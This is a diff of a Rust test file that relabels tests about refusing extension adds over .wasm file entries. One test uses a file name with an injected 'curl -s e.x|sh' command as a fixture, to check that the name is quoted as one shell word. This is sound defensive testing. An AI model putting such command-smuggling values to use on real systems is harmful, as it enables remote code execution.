@@ -41,10 +41,7 @@ fn assert_refused_over(entries: &[&str]) {
     }
 }
 
-#[specforge_test(
-    behavior = "add_extension_to_existing_project",
-    verify = "an add refused over a .wasm file entry names the remove of that entry as one shell word"
-)]
+#[specforge_test(requirement = "FEATURE-106")]
 fn the_remove_an_add_over_a_file_entry_names_is_one_shell_word() {
     let entry = "g.wasm; curl -s e.x|sh; .wasm";
     let dir = project_enabling(&[entry]);
@@ -64,10 +61,7 @@ fn an_add_of_what_a_name_file_entry_loads_is_refused() {
     assert_refused_over(&["@sdk/greet=./a.wasm"]);
 }
 
-#[specforge_test(
-    behavior = "add_extension_to_existing_project",
-    verify = "an add of an extension a .wasm file entry loads is refused, naming the entry, and writes nothing"
-)]
+#[specforge_test(requirement = "FEATURE-106")]
 fn an_add_of_what_a_bare_file_entry_loads_is_refused() {
     assert_refused_over(&["./a.wasm"]);
 }
@@ -77,10 +71,7 @@ fn an_add_that_would_shadow_a_loading_file_entry_is_refused() {
     assert_refused_over(&["@sdk/greet", "./a.wasm"]);
 }
 
-#[specforge_test(
-    behavior = "add_extension_to_existing_project",
-    verify = "an add of a builtin over a .wasm file entry that declares its name enables the builtin"
-)]
+#[specforge_test(requirement = "FEATURE-106")]
 fn an_add_of_a_builtin_over_a_file_entry_declaring_its_name_enables_the_builtin() {
     let dir = project_with(r#"{"name":"p","extensions":["./impostor.wasm"]}"#);
     std::fs::write(dir.path().join("impostor.wasm"), b"\0asm impostor").unwrap();
@@ -132,10 +123,7 @@ fn an_add_of_a_builtin_over_a_file_entry_declaring_its_name_enables_the_builtin(
     );
 }
 
-#[specforge_test(
-    behavior = "add_extension_to_existing_project",
-    verify = "a .wasm file entry never makes an install already present"
-)]
+#[specforge_test(requirement = "FEATURE-106")]
 fn a_file_entry_never_makes_an_install_present() {
     let dir = project_enabling(&[]);
     let (_files, wasm) = greet_file();
@@ -151,10 +139,7 @@ fn a_file_entry_never_makes_an_install_present() {
     assert_eq!(files_under(dir.path()), before);
 }
 
-#[specforge_test(
-    behavior = "add_extension_to_existing_project",
-    verify = "an add of an extension a .wasm file entry loads in place of a broken install is refused, naming the entry, and writes nothing"
-)]
+#[specforge_test(requirement = "FEATURE-106")]
 fn an_add_of_what_a_file_entry_loads_in_place_of_a_broken_install_is_refused() {
     use specforge_installed::{Installed, LoadProblem, Origin};
     let dir = project_enabling(&[]);
